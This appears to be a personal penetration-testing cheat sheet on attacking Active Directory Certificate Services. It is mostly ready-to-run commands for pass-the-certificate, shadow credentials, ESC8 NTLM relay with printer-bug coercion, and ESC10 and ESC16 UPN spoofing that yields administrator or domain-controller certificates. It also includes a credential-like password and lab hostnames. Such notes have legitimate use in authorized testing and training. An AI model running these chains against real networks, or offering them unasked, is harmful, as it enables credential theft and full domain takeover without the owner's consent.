# Pass the certificate

When we somehow have a certificate of another user, we can pass this certificate to obtain the user's `NTLM` hash

```sh
certipy auth -pfx "administrator.pfx" -dc-ip '172.16.x.x' -username 'user' -domain 'domain'
```

If the pfx is protected by a password, decrypt it first

```sh
certipy cert -export -pfx "administrator.pfx" -password "CERT_PASSWORD" -out "administrator_decrypted.pfx"
```

# Shadow credentials

Don't know how this works, black magic. [Here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)'s a writeup for more info on the attack.

When you have `GenericWrite` on an account, and ADCS is installed on the domain, we can use `certipy` to request the target account's `certificate`, then `TGT`, then NTLM hash.

```sh
certipy-ad shadow auto -account ca_svc -u p.agila -p 'prometheusx-303' -dc-ip $target
```

# Find ADCS vulns

```sh
certipy-ad find -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -vulnerable
```

## ESC8
This is the [`ESC8`](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) attack. Basically the vulnerable part is that it has ADCS `HTTP` endpoint.

It is vulnerable to NTLM relay attack . Certificate authority web enrollment usually is at `/certsrv`. Now we get the certificate from that CA.

![/images/0088f156de07b09ffcb79c4ee07a3ae95e494148cacc7a262ca7cae1211a7f53.jpeg]({{< relref "/images/0088f156de07b09ffcb79c4ee07a3ae95e494148cacc7a262ca7cae1211a7f53.jpeg" >}})
### Set relay server

```sh
impacket-ntlmrelayx -t http://ca01.inlanefreight.local/certsrv/ --adcs -smb2support --template KerberosAuthentication
```

Use [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) script to make the target machine authenticate to our machine. Our machine will then pass the authentication to the CA and get a cert.

### Printer bug

The target needs to have `Printer Spooler` service running

```sh
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py 'domain.name/user:pass@ca-ip' <attacker-ip>
```

After this, you should get a cert, do [#Pass the certificate]({{< relref "#pass-the-certificate" >}})
## ESC10

[Resource](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

Very hard to find. This is a misconfiguration on the ADCS server, not on the certificate template. Need a shell on the DC to check/enumerate

### Case 2

If this returns `0x4`, we golden

```cmd
reg query "HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v "CertificateMappingMethods"
```

First, let's change the UPN of a user that we can write to. See [10. Lateral Movement/Enumeration#Writable Objects]({{< relref "10. Lateral Movement/Enumeration#writable-objects" >}})

Change it to the `Domain Controller` UPN, it is not a constraint violation since the `DC01$` computer account does not have `userPrincipalName`

```sh
bloodyAD -d domain.name --host dc01.domain.name -u 'user' -p 'password' set object 'victim' userPrincipalName -v 'dc01$'
```

Then, request a certificate of the victim account

```sh
certipy-ad req -u 'victim' -p 'password' -dc-ip 10.10.11.78 -ca Corp-DC01-CA -target dc01.domain.name -template User
```

And change the UPN of the account we control back to original (or random value, doesn't matter)

```sh
bloodyAD -d domain.name --host dc01.domain.name -u 'user' -p 'password' set object 'victim' userPrincipalName -v 'victim@domain.name'
```

Finally, authenticate using the pfx we got. However, we must use the certificate for authentication via Schannel, so `-ldap-shell` is absolutely needed

```sh
certipy-ad auth -pfx "dc01.pfx" -dc-ip '10.10.11.78' -domain 'domain.name' -ldap-shell
```

Then we can do some RBCD. First we have to set RBCD to a computer account that we control

```sh
set_rbcd dc01$ controlled_computer$
```

Then follow these steps to do [RBCD]({{< relref "10. Lateral Movement/DACL Abuse#rbcd" >}})

## ESC16

> idk how this works
### Change upn

Change you upn to `administrator`. Need `GenericWrite` on yourself, or use another account to do this

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn administrator update
```

Normally, `Administrator`'s upn is usually `Administrator` or `Administrator@domain.name`. If the above command does not work, add the `@domain.name`

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn Administrator@domain.name update
```

### Request cert

Request your own certificate, with upn `Administrator`

```sh
certipy-ad req -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -upn administrator -ca fluffy-DC01-CA -template User
```

### Restore upn

> This step is required.

Change you upn back to original

```sh
certipy-ad account -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -user ca_svc -upn ca_svc update
```

After this step, you should get a cert that can authenticate as administrator. Do [#Pass the certificate]({{< relref "#pass-the-certificate" >}})